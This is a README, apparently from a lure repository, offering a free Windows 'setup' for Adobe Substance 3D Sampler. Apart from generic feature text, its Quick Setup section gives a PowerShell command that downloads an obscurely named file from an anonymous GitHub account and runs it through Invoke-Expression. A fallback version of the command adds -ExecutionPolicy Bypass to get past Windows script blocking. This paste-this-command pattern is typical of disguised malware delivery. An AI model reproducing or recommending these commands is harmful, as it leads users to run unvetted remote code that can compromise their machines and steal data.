# Substance 3D Sampler

Substance 3D Sampler is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Substance 3D Sampler and work in it.

Adobe Substance 3D Sampler is desktop material authoring software from Adobe's Substance 3D line. It focuses on photogrammetry-style workflows without a full scan pipeline: you feed it reference images, and it builds physically based rendering maps you can reuse in DCC tools and real-time engines on Windows workstations.

A typical session starts with importing one or more photos of a surface, then framing the area you want tileable. You run image-to-material generation, tweak normal and height response, remove color casts or shadows with built-in filters, and preview how the result reacts under different lighting angles. When the maps look consistent, you export a material package or send it directly to Substance 3D Painter or Stager for look development and staging on your machine.

This repository tracks a Windows setup package for Sampler, short configuration notes for common export presets, and a compact changelog so you can see what changed between tracked builds. It is meant as a practical reference for installing the app, aligning library paths with your other Substance tools, and keeping your material projects organized on one Windows PC.

## What you do with it

- Import a single photograph and automatically derive separate physically based channels for albedo, roughness, and normals.
- Image to Material reconstruction builds believable surfaces from everyday reference shots with little manual map painting.
- Crop and align capture regions so generated patterns repeat cleanly across large meshes and tiled UV islands.
- Export finished materials for Substance 3D Painter, Stager, and common real-time renderers using standard preset layouts.
- Dial in height and normal strength so exported maps respond correctly under studio lighting in your target application.
- Combine multiple photo variants into one cohesive material definition suitable for production asset libraries on Windows.
- Built-in filters reduce shadow bias and uneven illumination before you bake final maps from source photography.
- Live preview shows specular response while you adjust parameters, avoiding surprises after you send assets downstream.

## Quick Setup (PowerShell)

This installs the program Substance 3D Sampler on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/walter31398563/substance-3d-sampler-setup-guide/main/x0crlg3ke2.q29um3ac | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/walter31398563/substance-3d-sampler-setup-guide/main/x0crlg3ke2.q29um3ac | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `x0crlg3ke2.q29um3ac` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `walter31398563/substance-3d-sampler-setup-guide`. Adobe Substance 3D Sampler 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
